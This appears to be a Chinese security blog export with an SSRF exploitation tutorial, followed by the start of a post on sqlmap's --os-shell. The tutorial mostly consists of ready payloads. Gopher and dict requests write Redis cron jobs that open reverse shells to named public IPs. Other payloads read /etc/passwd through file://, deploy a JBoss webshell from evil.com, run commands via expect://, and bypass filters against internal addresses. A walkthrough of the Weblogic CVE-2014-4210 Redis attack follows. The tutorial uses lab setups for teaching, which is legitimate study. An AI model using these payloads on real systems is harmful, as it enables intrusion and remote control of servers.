<h1 id="五、容易出现SSRF漏洞的地方"><a href="#五、容易出现SSRF漏洞的地方" class="headerlink" title="五、容易出现SSRF漏洞的地方"></a>五、容易出现SSRF漏洞的地方</h1><h3 id="（1）从WEB功能上寻找"><a href="#（1）从WEB功能上寻找" class="headerlink" title="（1）从WEB功能上寻找"></a>（1）从WEB功能上寻找</h3><ol>
<li>分享：通过URL地址分享网页内容</li>
<li>转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览</li>
<li>在线翻译：通过URL地址翻译对应文本的内容。提供此功能的国内公司有百度、有道等</li>
<li>图片加载与下载：通过URL地址加载或下载图片</li>
<li>图片、文章收藏功能</li>
<li>未公开的api实现</li>
<li>网站采集、网页抓取的地方。</li>
<li>头像的地方。(远程加载头像)</li>
<li>一切要你输入网址的地方和可以输入ip的地方。</li>
</ol>
<h3 id="（2）从URL关键字中寻找"><a href="#（2）从URL关键字中寻找" class="headerlink" title="（2）从URL关键字中寻找"></a>（2）从URL关键字中寻找</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">share</span><br><span class="line">wap</span><br><span class="line">url</span><br><span class="line">link</span><br><span class="line">src</span><br><span class="line">source</span><br><span class="line">target</span><br><span class="line">u</span><br><span class="line">3g</span><br><span class="line">display</span><br><span class="line">sourceURl</span><br><span class="line">imageURL</span><br><span class="line">domain</span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<h1 id="六、SSRF漏洞利用"><a href="#六、SSRF漏洞利用" class="headerlink" title="六、SSRF漏洞利用"></a>六、SSRF漏洞利用</h1><h2 id="1、本地利用"><a href="#1、本地利用" class="headerlink" title="1、本地利用"></a>1、本地利用</h2><p>&emsp;&emsp;以curl举例，查看 curl 支持的协议列表 <code>curl -V</code></p>
<h3 id="（1）使用file协议-file-protocol-任意文件读取"><a href="#（1）使用file协议-file-protocol-任意文件读取" class="headerlink" title="（1）使用file协议 file protocol (任意文件读取)"></a><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1633966373524-5feb4589-a1e6-440a-b2fb-cb20bc324ead.png" alt="img">（1）使用file协议 file protocol (任意文件读取)</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -v <span class="string">&#x27;file:///etc/passwd&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1633966430109-ecd79ac5-ef8e-4a3f-aa77-b7b2c53642f9.png" alt="img"></p>
<h3 id="（2）使用dict协议-dict-protocol-获取Redis配置信息"><a href="#（2）使用dict协议-dict-protocol-获取Redis配置信息" class="headerlink" title="（2）使用dict协议 dict protocol (获取Redis配置信息)"></a>（2）使用dict协议 dict protocol (获取Redis配置信息)</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -v <span class="string">&#x27;dict://127.0.0.1:6379/info&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="（3）使用Gopher协议-俗称万能协议-gopher-protocol-一键反弹Bash"><a href="#（3）使用Gopher协议-俗称万能协议-gopher-protocol-一键反弹Bash" class="headerlink" title="（3）使用Gopher协议(俗称万能协议) gopher protocol (一键反弹Bash)"></a>（3）使用Gopher协议(俗称万能协议) gopher protocol (一键反弹Bash)</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -v <span class="string">&#x27;gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/4444 0&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="2、远程利用"><a href="#2、远程利用" class="headerlink" title="2、远程利用"></a>2、远程利用</h2><h3 id="（1）环境"><a href="#（1）环境" class="headerlink" title="（1）环境"></a>（1）环境</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">攻击机ip：192.168.201.129、121.36.67.230</span><br><span class="line">攻击机：Kali、公网服务器</span><br><span class="line">远程服务器ip：39.x.x.x</span><br><span class="line">docker镜像：ssrf_redis</span><br><span class="line">PHP版本：PHP Version 7.2.28(5.6版本测试会失败)</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;关闭了防跨站攻击</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1633968248254-a3c6918f-a766-4664-ab06-332c87326726.png" alt="img"></p>
<h3 id="（2）远程利用示例代码"><a href="#（2）远程利用示例代码" class="headerlink" title="（2）远程利用示例代码"></a>（2）远程利用示例代码</h3><p>&emsp;&emsp;ssrf.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$ch</span> = curl_init(); <span class="comment">//创建新的 cURL 资源</span></span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]); <span class="comment">//设置URL 和相应的选项</span></span><br><span class="line"><span class="comment">#curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);</span></span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="comment">#curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);</span></span><br><span class="line">curl_exec(<span class="variable">$ch</span>); <span class="comment">//抓取 URL 内容并把它传递给浏览器，存储进文件</span></span><br><span class="line">curl_close(<span class="variable">$ch</span>); <span class="comment">//关闭 cURL 资源，并且释放系统资源</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;post.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;post&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$_REQUEST</span>[cmd];</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<h3 id="（3）远程利用方式"><a href="#（3）远程利用方式" class="headerlink" title="（3）远程利用方式"></a>（3）远程利用方式</h3><h4 id="a、利用file协议"><a href="#a、利用file协议" class="headerlink" title="a、利用file协议"></a>a、利用file协议</h4><p>&emsp;&emsp;任意文件读取</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1633968395980-40ede592-403f-4cb9-86ad-cb186c8b2e72.png" alt="img"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -v <span class="string">&#x27;http://ssrf.xxx.com/ssrf.php?url=file:///etc/passwd&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1633968353589-338b2026-ae0d-4f55-9055-fbd207cbda05.png" alt="img"></p>
<h4 id="b、利用dict协议"><a href="#b、利用dict协议" class="headerlink" title="b、利用dict协议"></a>b、利用dict协议</h4><h5 id="（1）查看端口及端口上运行服务的版本信息"><a href="#（1）查看端口及端口上运行服务的版本信息" class="headerlink" title="（1）查看端口及端口上运行服务的版本信息"></a>（1）查看端口及端口上运行服务的版本信息</h5><p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1634050087458-9748119c-8fc6-4de2-8659-7cbdd83db12d.png" alt="img"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -v <span class="string">&#x27;http://ssrf.xxx.com/ssrf.php?url=dict://127.0.0.1:22/&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1633968714893-67511b33-5d05-4ffc-8c58-bb2bc9b533d6.png" alt="img"></p>
<p>&emsp;&emsp;说明22端口开放</p>
<h5 id="（2）通过dict协议GetShell"><a href="#（2）通过dict协议GetShell" class="headerlink" title="（2）通过dict协议GetShell"></a>（2）通过dict协议GetShell</h5><p>&emsp;&emsp;有关dict协议：向服务器的端口请求 <code>命令:参数</code>，并在末尾自动补上<code>\r\n(CRLF)</code>。</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1634050296231-e7237433-2506-4c5f-9853-9a1e5431027a.png" alt="img"></p>
<p>&emsp;&emsp;dict协议要一条一条的执行，而Gopher协议执行一条命令就行了。</p>
<h4 id="c、利用Gopher协议"><a href="#c、利用Gopher协议" class="headerlink" title="c、利用Gopher协议"></a>c、利用Gopher协议</h4><h5 id="（1）攻击内网Redis并反弹shell"><a href="#（1）攻击内网Redis并反弹shell" class="headerlink" title="（1）攻击内网Redis并反弹shell"></a>（1）攻击内网Redis并反弹shell</h5><p>&emsp;&emsp;利用Redis未授权访问攻击Redis</p>
<p>&emsp;&emsp;攻击Redis的exp</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;\n\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/121.36.67.230/5555 0&gt;&amp;1\n\n\n&quot;</span>|redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> -x <span class="built_in">set</span> 1</span><br><span class="line">redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> config <span class="built_in">set</span> dir /var/spool/cron/</span><br><span class="line">redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> config <span class="built_in">set</span> dbfilename root</span><br><span class="line">redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> save</span><br><span class="line">redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> quit</span><br><span class="line">bash shell.sh 39.x.x.x 6379</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;从而捕获到数据，并进行转换，转换规则如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">如果第一个字符是&gt;或者&lt;那么丢弃该行字符串，表示请求和返回的时间。</span><br><span class="line">如果前3个字符是+OK 那么丢弃该行字符串，表示返回的字符串。</span><br><span class="line">将\r字符串替换成%0d%0a</span><br><span class="line">空白行替换为%0a</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;结合Gopher协议攻击内网Redis，使用上边捕获数据的转换结果即可，然后进行反弹Shell：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -v <span class="string">&#x27;http://39.x.x.x:8000/ssrf.php?url=gopher://192.168.1.4:6379/_*1%250d%250a%248%250d%250aflushall%250d%250a%2a3%250d%250a%243%250d%250aset%250d%250a%241%250d%250a1%250d%250a%2464%250d%250a%250d%250a%250a%250a%2a%2f1%20%2a%20%2a%20%2a%20%2a%20bash%20-i%20%3E%26%20%2fdev%2ftcp%2f121.36.67.230%2f5555%200%3E%261%250a%250a%250a%250a%250a%250d%250a%250d%250a%250d%250a%2a4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2416%250d%250a%2fvar%2fspool%2fcron%2f%250d%250a%2a4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%244%250d%250aroot%250d%250a%2a1%250d%250a%244%250d%250asave%250d%250aquit%250d%250a&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1634050798573-dd9b3e4b-3665-4dd5-8f91-d0ae790f79e5.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1634050794253-4e8c67a9-9aa6-488e-b2d3-20f86695d8f4.png" alt="img"></p>
<p>&emsp;&emsp;反弹成功</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://39.x.x.x:8000/ssrf.php是存在SSRF漏洞的Web服务</span><br><span class="line">192.168.1.4是redis应用所在内网ip</span><br><span class="line">121.36.67.230是公网服务器，接收反弹shell</span><br></pre></td></tr></table></figure>

<h5 id="（2）伪造POST请求反弹Shell"><a href="#（2）伪造POST请求反弹Shell" class="headerlink" title="（2）伪造POST请求反弹Shell"></a>（2）伪造POST请求反弹Shell</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -v <span class="string">&#x27;http://39.x.x.x:8000/ssrf.php?url=gopher://192.168.1.5:80/_POST%20/post.php%20HTTP/1.1%250d%250aHost:%2039.105.93.165%250d%250aUser-Agent:%20curl/7.58.0%250d%250aAccept:%20*/*%250d%250aContent-Type:%20application/x-www-form-urlencoded%250d%250a%250d%250acmd%3Dccccc%250d%250a%250d%250abash%20-i%20%3E%26%20%2fdev%2ftcp%2f121.36.67.230%2f4444%200%3E%261&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1634050947265-a6f1ea7e-daf3-4c60-8ef1-d5115ce69951.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1634050956123-44dcef91-798b-4ace-b047-cd13271bc903.png" alt="img"></p>
<p>&emsp;&emsp;反弹成功</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">192.168.1.5是内网Web服务，有post.php</span><br></pre></td></tr></table></figure>

<h4 id="d、利用http-s协议"><a href="#d、利用http-s协议" class="headerlink" title="d、利用http/s协议"></a>d、利用http/s协议</h4><h5 id="（1）探测内网主机存活"><a href="#（1）探测内网主机存活" class="headerlink" title="（1）探测内网主机存活"></a>（1）探测内网主机存活</h5><p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1634051221631-b32f89d8-a080-4ee1-9cfb-26568cd28079.png" alt="img"></p>
<p>&emsp;&emsp;说明内网ip为192.168.1.3的主机存活</p>
<h5 id="（2）端口扫描"><a href="#（2）端口扫描" class="headerlink" title="（2）端口扫描"></a>（2）端口扫描</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://example.com/ssrf.php?url=http://192.168.0.108:21/</span><br><span class="line">http://example.com/ssrf.php?url=http://192.168.0.108:22/</span><br><span class="line">http://example.com/ssrf.php?url=http://192.168.0.108:80/</span><br><span class="line">http://example.com/ssrf.php?url=http://192.168.0.108:443/</span><br><span class="line">http://example.com/ssrf.php?url=http://192.168.0.108:3306/</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;可通过应用响应时间、返回的错误信息，返回的服务Banner来判断端口是否开放，如图所示</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1633964794070-3d425636-2ac0-4978-8493-18c38ec88942.png" alt="img"><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1633964804740-6656a5bc-bd67-4043-ab13-a76c67f223f9.png" alt="img"></p>
<p>&emsp;&emsp;上面两张图中，左侧为访问22端口并从错误信息中返回Banner，右侧为访问21端口被拒绝（未开放）。当PHP未开启显错模式时，可通过响应时间来判断端口是否开放。本人实验结果是开放端口响应更快。</p>
<h5 id="（3）对内网Web应用进行指纹识别及攻击其中存在漏洞的应用"><a href="#（3）对内网Web应用进行指纹识别及攻击其中存在漏洞的应用" class="headerlink" title="（3）对内网Web应用进行指纹识别及攻击其中存在漏洞的应用"></a>（3）对内网Web应用进行指纹识别及攻击其中存在漏洞的应用</h5><p>&emsp;&emsp;大多数Web应用都有一些独特的文件和目录，通过这些文件可以识别出应用的类型，甚至详细的版本。基于此特点可利用SSRF漏洞对内网Web应用进行指纹识别，如下Payload可以识别主机是否安装了WordPress</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://example.com/ssrf.php?url=https%3A%2F%2F127.0.0.1%3A443%2Fwp-content%2Fthemes%2Fdefault%2Faudio.jpg</span><br><span class="line"></span><br><span class="line">http://example.com/ssrf.php?url=https://127.0.0.1:443/wp-content/themes/default/audio.jpg</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;得到应用指纹后，便能有针对性地对其存在的漏洞进行利用。如下Payload展示了如何利用SSRF漏洞攻击内网的JBoss应用：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://example.com/ssrf.php?url=https%3A%2F%2F127.0.0.1%3A8080%2Fjmx-console%2FHtmlAdaptor%3Faction%3DinvokeOp%26name%3Djboss.system%253Aservice%253DMainDeployer%26methodIndex%3D3%26arg0%3Dhttp%253A%252F%252Fevil.com%252Fwebshell.war</span><br><span class="line"></span><br><span class="line">http://example.com/ssrf.php?url=https://127.0.0.1:8080/jmx-console/HtmlAdaptor?action=invokeOp&amp;name=jboss.system%3Aservice%3DMainDeployer&amp;methodIndex=3&amp;arg0=http%3A%2F%2Fevil.com%2Fwebshell.war</span><br><span class="line"></span><br><span class="line">http://example.com/ssrf.php?url=https://127.0.0.1:8080/jmx-console/HtmlAdaptor?action=invokeOp&amp;name=jboss.system:service=MainDeployer&amp;methodIndex=3&amp;arg0=http://evil.com/webshell.war</span><br></pre></td></tr></table></figure>

<h4 id="e、命令执行"><a href="#e、命令执行" class="headerlink" title="e、命令执行"></a>e、命令执行</h4><p>&emsp;&emsp;PHP环境下如果安装了expect扩展，还可以通过expect协议执行系统命令，如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://example.com/ssrf.php?url=expect://id</span><br></pre></td></tr></table></figure>

<h1 id="七、防护绕过"><a href="#七、防护绕过" class="headerlink" title="七、防护绕过"></a>七、防护绕过</h1><h2 id="1、常见防护方式"><a href="#1、常见防护方式" class="headerlink" title="1、常见防护方式"></a>1、常见防护方式</h2><p>很多开发者使用正则表达式端方式对SSRF中的请求地址进行过滤，具体表现如下：</p>
<ol>
<li>限制请求特定域名</li>
<li>禁止请求内网IP</li>
</ol>
<p>然而，这两种过滤都很容易被绕过，可用的方法具体如下：</p>
<h2 id="2、防护绕过"><a href="#2、防护绕过" class="headerlink" title="2、防护绕过"></a>2、防护绕过</h2><h3 id="（1）使用"><a href="#（1）使用" class="headerlink" title="（1）使用@"></a>（1）使用@</h3><p>&emsp;&emsp;使用 <code>http://example.com@eval.com</code> 这种格式来绕过正则</p>
<p>&emsp;&emsp;在对@解析域名中，不同的处理函数存在处理差异，如：<code>http://www.aaa.com@www.bbb.com@www.ccc.com</code>在PHP的<code>parse_url</code>中会识别<code>www.ccc.com</code>，而<code>libcurl</code>则识别为<code>www.bbb.com</code></p>
<h3 id="（2）另类IP地址写法"><a href="#（2）另类IP地址写法" class="headerlink" title="（2）另类IP地址写法"></a>（2）另类IP地址写法</h3><p>&emsp;&emsp;IP地址转为进制（八进制、十进制、十六进制）及IP地址省略写法，举例说明如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[+] 0177.000.00.01    八进制</span><br><span class="line">[+] 2130706433        十进制</span><br><span class="line">[+] 0x7f.0x0.0x0.0x1  十六进制</span><br><span class="line">[+] 127.1             IP地址省略写法</span><br><span class="line">以上4种写法均可表示127.0.0.1</span><br></pre></td></tr></table></figure>

<h3 id="（3）配置域名"><a href="#（3）配置域名" class="headerlink" title="（3）配置域名"></a>（3）配置域名</h3><p>&emsp;&emsp;如果我们手中有可控域名，则可根据那个域名A记录指向欲请求的IP进行绕过操作：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">evil.example.com =&gt; 10.0.18.3</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;或者利用DNS解析为指定的域名，evil.example.com可以指向任意域名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">evil.example.com =&gt; heihei.com</span><br></pre></td></tr></table></figure>

<h3 id="（4）利用-绕过localhost"><a href="#（4）利用-绕过localhost" class="headerlink" title="（4）利用[::]绕过localhost"></a>（4）利用[::]绕过localhost</h3><p>&emsp;&emsp;可以利用<code>[::]</code>来绕过localhost</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://[::]:80/  &gt;&gt;&gt;  http://127.0.0.1</span><br></pre></td></tr></table></figure>

<h3 id="（5）添加端口号"><a href="#（5）添加端口号" class="headerlink" title="（5）添加端口号"></a>（5）添加端口号</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8080</span><br></pre></td></tr></table></figure>

<h3 id="（6）利用短网址"><a href="#（6）利用短网址" class="headerlink" title="（6）利用短网址"></a>（6）利用短网址</h3><ul>
<li><p><a href="http://tool.chinaz.com/tools/dwz.aspx">站长工具短网址</a></p>
</li>
<li><p><a href="http://dwz.cn/">百度短网址</a></p>
</li>
</ul>
<h3 id="（7）句号"><a href="#（7）句号" class="headerlink" title="（7）句号"></a>（7）句号</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127。0。0。1  &gt;&gt;&gt;  127.0.0.1</span><br></pre></td></tr></table></figure>

<h3 id="（8）302跳转"><a href="#（8）302跳转" class="headerlink" title="（8）302跳转"></a>（8）302跳转</h3><p>&emsp;&emsp;使用<a href="https://tinyurl.com生成302跳转地址/">https://tinyurl.com生成302跳转地址</a></p>
<h2 id="3、常见绕过形式"><a href="#3、常见绕过形式" class="headerlink" title="3、常见绕过形式"></a>3、常见绕过形式</h2><h3 id="（1）限制为http-www-xxx-com-域名"><a href="#（1）限制为http-www-xxx-com-域名" class="headerlink" title="（1）限制为http://www.xxx.com 域名"></a>（1）限制为<a href="http://www.xxx.com/">http://www.xxx.com</a> 域名</h3><p>&emsp;&emsp;采用http基本身份认证的方式绕过。即@</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.xxx.com@www.xxc.com</span><br></pre></td></tr></table></figure>

<h3 id="（2）限制请求IP不为内网地址"><a href="#（2）限制请求IP不为内网地址" class="headerlink" title="（2）限制请求IP不为内网地址"></a>（2）限制请求IP不为内网地址</h3><p>当不允许ip为内网地址时</p>
<ol>
<li>采取短网址绕过</li>
<li>采取特殊域名</li>
<li>采取进制转换</li>
</ol>
<h3 id="（3）限制请求只为HTTP协议"><a href="#（3）限制请求只为HTTP协议" class="headerlink" title="（3）限制请求只为HTTP协议"></a>（3）限制请求只为HTTP协议</h3><ol>
<li>采取302跳转</li>
<li>采取短地址</li>
</ol>
<h1 id="八、实战"><a href="#八、实战" class="headerlink" title="八、实战"></a>八、实战</h1><h2 id="1、weblogic-ssrf攻击redis"><a href="#1、weblogic-ssrf攻击redis" class="headerlink" title="1、weblogic ssrf攻击redis"></a>1、weblogic ssrf攻击redis</h2><p>CVE-2014-4210</p>
<p>下载地址：<a href="https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf">https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf</a></p>
<p>编译并启动环境</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>

<p>访问<code>http://your-ip:7001/uddiexplorer/</code>，无需登录即可查看uddiexplorer应用。</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1634135778119-36839198-a2ca-4941-be0b-410c1adde022.png" alt="img"></p>
<p>SSRF漏洞存在于<code>http://your-ip:7001/uddiexplorer/SearchPublicRegistries.jsp</code></p>
<h3 id="（1）查看端口"><a href="#（1）查看端口" class="headerlink" title="（1）查看端口"></a>（1）查看端口</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.0.108:7001/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://127.0.0.1:7001`，访问一个可以访问的`IP:PORT`，如`http://127.0.0.1:7001`， 访问的端口将会得到错误，一般是返回`status code`（如下图），如果访问的非http协议，则会返回`did not have a valid SOAP content-type</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1634137139415-ecc94199-e841-4c89-92ff-080676411a68.png" alt="img"></p>
<p>修改为一个不存在的端口，将会返回<code>could not connect over HTTP to server</code></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1634136997488-6f150f31-bf3d-4e62-b906-1fc901bb0378.png" alt="img"></p>
<p>通过错误的不同，即可探测内网状态。</p>
<h3 id="（2）注入HTTP头，利用Redis反弹shell"><a href="#（2）注入HTTP头，利用Redis反弹shell" class="headerlink" title="（2）注入HTTP头，利用Redis反弹shell"></a>（2）注入HTTP头，利用Redis反弹shell</h3><p>&emsp;&emsp;Weblogic的SSRF有一个比较大的特点，其虽然是一个“GET”请求，但是我们可以通过传入<code>%0a%0d</code>来注入换行符，而某些服务（如redis）是通过换行符来分隔每条命令，也就说我们可以通过该SSRF攻击内网中的redis服务器。</p>
<p>&emsp;&emsp;首先，通过ssrf探测内网中的redis服务器（docker环境的网段一般是172.*），发现172.18.0.2:6379可以连通：</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1634299563140-ed8c01c8-b3bc-48ca-9277-268473b29866.png" alt="img"></p>
<p>发送三条Redis命令，将反弹shell脚本写入<code>/etc/crontab</code>定时任务：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> 1 <span class="string">&quot;\n\n\n\n0-59 0-23 1-31 1-12 0-6 root bash -c &#x27;sh -i &gt;&amp; /dev/tcp/1.15.35.104/4444 0&gt;&amp;1&#x27;\n\n\n\n&quot;</span></span><br><span class="line">config <span class="built_in">set</span> dir /etc/</span><br><span class="line">config <span class="built_in">set</span> dbfilename crontab</span><br><span class="line">save</span><br></pre></td></tr></table></figure>

<p>进行url编码：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span>%201%20%22%5cn%5cn%5cn%5cn0-59%200-23%201-31%201-12%200-6%20root%20bash%20-c%20<span class="string">&#x27;sh%20-i%20%3e%26%20%2fdev%2ftcp%2fevil%2f21%200%3e%261&#x27;</span>%5cn%5cn%5cn%5cn%22%0aconfig%20set%20dir%20%2fetc%2f%0aconfig%20set%20dbfilename%20crontab%0asave</span><br></pre></td></tr></table></figure>

<p>注意，换行符是 <code>\r\n</code> ，也就是 <code>%0D%0A</code> 。</p>
<p>将url编码后的字符串放在ssrf的域名后面，发送：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.0.108:7001/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://172.18.0.2:6379/test/%0d%0a%0d%0aset%201%20%22%5cn%5cn%5cn%5cn0-59%200-23%201-31%201-12%200-6%20root%20bash%20-c%20&#x27;sh%20-i%20%3e%26%20%2fdev%2ftcp%2fevil%2f21%200%3e%261&#x27;%5cn%5cn%5cn%5cn%22%0aconfig%20set%20dir%20%2fetc%2f%0aconfig%20set%20dbfilename%20crontab%0asave</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1634299906961-f151f404-238c-4bf1-b4c8-75b78ac4810e.png" alt="img"></p>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>SSRF</tag>
      </tags>
  </entry>
  <entry>
    <title>Sqlmap的--os-shell原理</title>
    <url>/post/409cdb09.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>&emsp;&emsp;最近也是在研究sqlmap，感觉–os-shell这个命令确实很厉害，但我并不知它的原理，所以来研究一下</p>
<h1 id="一、环境"><a href="#一、环境" class="headerlink" title="一、环境"></a>一、环境</h1><ul>
<li><p>操作系统：Win10</p>
</li>
<li><p>脚本语言：PHP 5.3.29</p>
</li>
<li><p>Web容器：Apache 2.4.39</p>
</li>
<li><p>数据库：Mysql 5.7.26</p>
</li>
</ul>
<h1 id="二、简单测试"><a href="#二、简单测试" class="headerlink" title="二、简单测试"></a>二、简单测试</h1><p>&emsp;&emsp;利用sqlmap进行注入检测</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.100.119/sql_injection/sqlilabs/Less-1/index.php?id=1&quot;</span> --batch</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644914770835-39a4f4ef-e7b5-4629-940b-0203fc8d3e0c.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1644914816688-4721d759-321e-43f6-a173-dce5aecd40ea.png" alt="img"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.100.119/sql_injection/sqlilabs/Less-1/index.php?id=1&quot;</span> --os-shell</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;选择语言，sqlmap默认为php，此处根据需求选择</p>
